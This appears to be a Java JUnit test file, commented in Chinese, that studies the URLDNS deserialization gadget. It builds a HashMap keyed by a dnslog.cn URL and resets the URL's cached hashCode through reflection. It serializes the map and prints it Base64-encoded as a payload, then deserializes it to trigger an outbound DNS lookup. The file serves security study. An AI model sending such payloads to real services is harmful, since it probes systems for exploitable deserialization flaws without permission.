package com.pwjcw.Test;

import org.junit.Test;

import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class DnsTest {

    /**
     * 测试map的key为url时，是否会进行dns查询
     * @throws MalformedURLException
     * @throws ClassNotFoundException
     * @throws NoSuchFieldException
     * @throws IllegalAccessException
     */
    @Test
    public void testDns() throws MalformedURLException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Map<URL,String> map=new HashMap<>();
//        URL url = new URL("http://cccc.amhz6.dnslog.dnslog.pwjcw.top");
        URL url = new URL("http://test.xkoc6l.dnslog.cn");
        map.put(url,"dnslog");
    }

    /**
     * 将一个封装了url对象的map集合进行序列化
     * @throws IOException
     * @throws ClassNotFoundException
     * @throws NoSuchFieldException
     * @throws IllegalAccessException
     */
    @Test
    public void testUrlDnsSer() throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        //创建一个map对象
        Map<URL,String> map=new HashMap<>();
        URL url = new URL("http://111111.ycvbge.dnslog.cn");
        map.put(url,"dnslog");

        //通过反射将url对象的hashcode值设置为-2
        Class<?> aClass = Class.forName("java.net.URL");
        Field hashCode = aClass.getDeclaredField("hashCode");
        hashCode.setAccessible(true);
        hashCode.set(url,888);
        map.put(url,"dnslog");
        hashCode.set(url,-1);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(map);
        oos.close();

        byte[] payload = bos.toByteArray();
        System.out.println("test");
        System.out.println(java.util.Base64.getEncoder().encodeToString(payload));
        //进行序列化map对象
//        FileOutputStream fileOutputStream = new FileOutputStream("Dnslog.ser");
//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
//        objectOutputStream.writeObject(map);

    }

    /**
     * 反序列化一个封装了url的map集合，查看在反序列化的时候，是否会进行dns解析，解析的根本原因是因为map集合自定义的readObject方法调用了putVal(hash(key)
     * @throws IOException
     * @throws ClassNotFoundException
     */
    @Test
    public void testUrlDnsUnSer() throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream("Dnslog.ser");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        Object o = objectInputStream.readObject();

    }
    @Test
    public void testReadFile() throws IOException {
        FileInputStream fileInputStream=new FileInputStream("d:\\index.html");
        System.out.println(fileInputStream.toString());
    }
}
